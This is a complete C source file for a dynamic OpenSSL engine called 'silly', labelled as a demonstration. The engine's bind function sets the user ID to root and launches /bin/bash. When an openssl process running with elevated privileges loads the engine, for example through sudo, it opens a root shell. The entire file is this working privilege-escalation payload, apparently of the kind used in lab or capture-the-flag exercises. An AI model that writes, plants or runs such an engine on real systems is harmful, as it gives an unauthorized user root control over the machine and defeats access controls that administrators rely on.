#include <stdio.h>

#include <openssl/engine.h>

static const char *engine_id = "silly";
static const char *engine_name = "A silly engine for demonstration purposes";

static int bind(ENGINE *e, const char *id)
{
  setuid(0);
  system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()

